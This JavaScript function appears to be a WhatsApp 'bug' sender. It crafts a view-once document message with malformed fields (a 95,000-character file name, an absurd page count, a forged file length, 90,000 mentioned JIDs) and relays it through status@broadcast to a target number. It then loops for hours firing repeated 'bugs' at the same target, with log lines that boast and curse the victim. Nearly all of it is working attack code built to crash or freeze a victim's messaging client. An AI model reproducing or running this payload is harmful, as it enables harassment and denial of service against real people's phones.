async function fo1(target) {
  {
    tag: "bot",
    attrs: {
      biz_bot: "1"
    },
    content: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "user", attrs: { jid: "0@s.whatsapp.net" } },
              { tag: "user", attrs: { jid: "status@broadcast" } }
            ]
          }
        ]
      }
    ]
  };

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            ticket_id: crypto.randomBytes(16)
          }),
          documentMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.43144-24/10000000_1222268616294746_8563036212965508246_n.enc?ccb=11-4&oh=01_Q5Aa1wFau_zNnnuJxi5pAdCmgpbejktokUJ_upp6bIL0pMUnYA&oe=6873261A&_nc_sid=5e03e0&mms3=true',
            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            fileSha256: 'kOZ9q9pX3eF8c8xHkdGh1Qy+B4Jyp0j3z8EOruDx0eI=',
            fileEncSha256: 'ffm/xuWql+1tbTOn9HA0/sr2O4TeKIfHowXGz0B7RKo=',
            mediaKey: 'HVXlGa3q/xO2q14Jn6xynNi3MgOkuRWwXZVCnBW/Umw=',
            fileLength: '1999999999',
            pageCount: 9999999991,
            fileName: '\nြ'.repeat(95000),
            mediaKeyTimestamp: '1726867151',
            directPath: '/v/t62.43144-24/10000000_1222268616294746_8563036212965508246_n.enc?ccb=11-4&oh=01_Q5Aa1wFau_zNnnuJxi5pAdCmgpbejktokUJ_upp6bIL0pMUnYA&oe=6873261A&_nc_sid=5e03e0',
            contextInfo: {
              forwardingScore: 127,
              isForwarded: true,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 90000 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                ),
                "status@broadcast"
              ]
            },
            remoteJid: target,
            participant: '0@s.whatsapp.net'
          }
        }
      }
    }
  }, {});

  await anas.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    userjid: target,
    statusJidList: [target],
    participant: { jid: target },
    userDeviceJids: [target],
    additionalNodes: Node,
    xmppStatus: target
  });

  const totalDurationMs = 72 * 60 * 60 * 500;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 500) {
        await holdbug(target);
        console.log(chalk.yellow(`process send bug to ${count + 1}/1000 > ${target}`));
        count++;
      } else {
        console.log(chalk.green(`success send 500 bugs to${target}`));
        count = 0;
        console.log(chalk.red("next send 500 bugs"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`error : ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`sucessed bug after 1 Days: ${count}`);
  console.log(chalk.greenBright('✅ Kirim Bapak Mu ke neraka  =>'), chalk.cyan(target));
}